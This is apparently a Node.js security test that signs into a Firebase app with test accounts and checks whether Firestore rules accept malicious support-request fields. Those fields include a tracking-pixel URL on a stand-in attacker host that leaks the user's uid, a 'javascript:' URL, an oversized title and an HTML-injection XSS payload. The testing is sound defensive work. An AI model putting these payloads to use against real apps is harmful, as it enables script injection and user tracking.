import { readFileSync } from 'node:fs';
import { setLogLevel } from 'firebase/app';
setLogLevel('silent');
import { client, attempt } from './lib.mjs';
import { doc, addDoc, setDoc, collection, getDoc } from 'firebase/firestore';
const A = JSON.parse(readFileSync(new URL('./out/hesaplar.json', import.meta.url)));
const now = Date.now();
const L = await client(A.bL1.email, A.bL1.password);
const fs = L.fs;
// minimal geçerli talep (app'in gönderdiği alanlarla)
const base = { storeId: 'S1', storeName: 'Moda', category: 'ekipman', priority: 'normal', detail: '', status: 'open', notes: [], createdAt: now, createdBy: A.bL1.uid, createdByName: 'Leyla', updatedAt: now, lastSide: 'store', closedAt: null };
for (const [name, extra] of [
  ['düz talep', { title: 'ok' }],
  ['dış adresli imageUrl', { title: 'Foto', imageUrl: 'https://saldirgan.example/piksel.png?u=' + A.bL1.uid }],
  ['javascript: imageUrl', { title: 'x', imageUrl: 'javascript:alert(1)' }],
  ['600 KB başlık', { title: 'B'.repeat(600 * 1024) }],
  ['HTML enjeksiyon başlık', { title: '<img src=x onerror=alert(1)>' }],
]) {
  const r = await attempt(() => addDoc(collection(L.db, 'requests'), { ...base, ...extra }));
  console.log((r.ok ? 'İZİN ' : 'red  ') + name + (r.code ? ' (' + r.code + ')' : '') + (r.ok ? ' id=' + r.value.id : ''));
}
await L.close();
process.exit(0);
